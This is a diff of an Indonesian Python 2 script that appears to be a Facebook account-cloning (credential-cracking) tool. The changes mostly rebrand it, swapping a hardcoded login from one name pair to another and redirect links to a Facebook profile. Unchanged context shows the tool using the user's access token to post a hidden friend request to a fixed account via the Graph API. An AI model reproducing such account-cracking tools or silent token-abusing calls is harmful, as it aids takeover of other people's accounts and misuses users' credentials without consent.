@@ -58,7 +58,7 @@ logo = """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk Om \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -90,7 +90,7 @@ def loginSC():
 	print"\033[1;97mLogin Sc nya dulu njing -_-\n"
         username = raw_input("\033[1;96m[★] \033[1;97musername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[★] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="Thex" and password =="Cyber":
+	if username =="Dawuk" and password =="Gans":
 		print"\033[1;96m[✓] \033[1;92mLogin success"
 		time.sleep(1)
 		login()
@@ -142,14 +142,14 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://m.youtube.com/channel/UCVaKVhhcdngVG1aGjzDFmg')
+				os.system('xdg-open https://www.facebook.com/satria.id.7739')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
-			os.system('xdg-open https://m.youtube.com/channel/UCVaKVhhcdngVG1aGjzDLFmg')
+			os.system('xdg-open https://www.facebook.com/satria.id.7739')
 			time.sleep(1)
 			keluar()
 		else:
@@ -199,7 +199,7 @@ def menu():
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;97m Thex »--> \033[1;97m")
+	unikers = raw_input("\n\033[1;97m Dawuk »--> \033[1;97m")
 	if unikers =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih()
@@ -242,7 +242,7 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97m Thex »--> \033[1;97m")
+	peak = raw_input("\n\033[1;97m Dawuk »--> \033[1;97m")
 	if peak =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih_super()
@@ -563,7 +563,7 @@ def yahoo():
 	clone()
        
 def clone():
-	embuh = raw_input("\n\x1b[1;97m Thex »--> ")
+	embuh = raw_input("\n\x1b[1;97m Dawuk »--> ")
 	if embuh =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 	elif embuh =="1":
